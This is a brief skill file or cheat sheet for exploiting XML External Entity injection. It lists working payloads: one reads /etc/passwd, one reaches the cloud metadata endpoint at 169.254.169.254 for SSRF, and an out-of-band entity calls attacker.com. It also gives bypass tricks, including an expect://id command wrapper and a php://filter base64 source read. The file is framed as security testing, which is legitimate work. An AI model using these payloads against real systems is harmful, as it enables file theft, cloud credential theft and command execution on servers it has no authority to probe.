---
name: testing-for-xxe-injection-vulnerabilities
description: Detect and exploit XML External Entity (XXE) injections for file disclosure, SSRF, and denial of service.
domain: cybersecurity
subdomain: web
tags:
- web
- xxe
- xml
- file-disclosure
- ssrf
version: '1.0'
---
# XXE Injection

## File Disclosure
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

## SSRF via XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

## Blind XXE (Out-of-Band)
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/data">
]>
```

## Bypass
- Encode entities: `&#x25;` for `%`
- Use parameter entities: `<!ENTITY % file SYSTEM "file:///flag.txt">`
- PHP wrapper: `expect://id` or `php://filter/convert.base64-encode/resource=file.php`
